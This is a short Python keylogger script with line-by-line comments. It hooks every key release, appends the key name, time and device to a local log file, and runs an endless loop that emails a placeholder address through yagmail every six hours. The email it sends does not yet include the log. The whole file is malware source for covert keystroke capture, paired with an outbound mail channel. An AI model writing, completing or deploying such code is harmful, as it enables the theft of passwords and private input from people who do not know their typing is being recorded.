import keyboard                 #import keyboard for listening to keystrokes
import logging                  #imporet Logging for recording keystrokes
import datetime                 #import Datetime to get time and date for keystrokes
import time                     #
import yagmail 

log_file = "loggedKeys.log"     #creating a variable called log_file and assigning it the value "loggedKeys.log"
logging.basicConfig(filename=log_file, level=logging.DEBUG) # Configuring basic logging settings, specifying the name of the log file and setting the logging level to DEBUG

def on_key_event(event):        #define a function called 'on_key_event' that takes a single parameter, 'event'

    try: 
        with open(log_file, 'a') as f: #this code opens the log file in 'append' mode and assigns the file object to the variable 'f'
            f.write(f"Key: {event.name}, Time: {datetime.datetime.now()}, Device: {event.device}\n") #if the file is opened successfully, then write the key event information to the file in the formatted string.
    except IOError:             #else write error message
            logging.exception("Failed to write to log file")

keyboard.on_release(callback=on_key_event) #setting up a listener for key release events and calls the 'on_key_event' function every time a key is released

#keyboard.wait()                 #keep the script running

def send_email():               #defining a function called 'send_email'
    
    sender_email = 'example_S@gmail.com'                        #creating a variable called 'sender_email' and assigning it the value of the sender's email address
    recceiver_email = 'example_R@gmail.com'                     #creating a variable called 'receiver_email' and assigning it the value of the receiver's email address
    subject = 'Keylogger'                                       #creating a variable called 'subject' and assigning it the value of the subject of the email
    body = 'This is an email sent by a keylogger'               #creating a variable called 'body' and assigning it the value of the body of the email

    try:
        yag = yagmail.SMTP(sender_email)                        #creating a variable called 'yag' and assigning it the value of the sender's email address
        yag.send(recceiver_email, subject, body)                #sending the email
        print('Email sent successfully XD')                        #printing a message if the email is sent successfully
    except:
        print('Error!!! email was not sent...')                      #printing a message if the email is not sent successfully

while True:                                                     #creating an infinite loop
    time.sleep(21600)                                           #setting the time interval for sending the email to 6 hours
    send_email()                                                #calling the 'send_email' function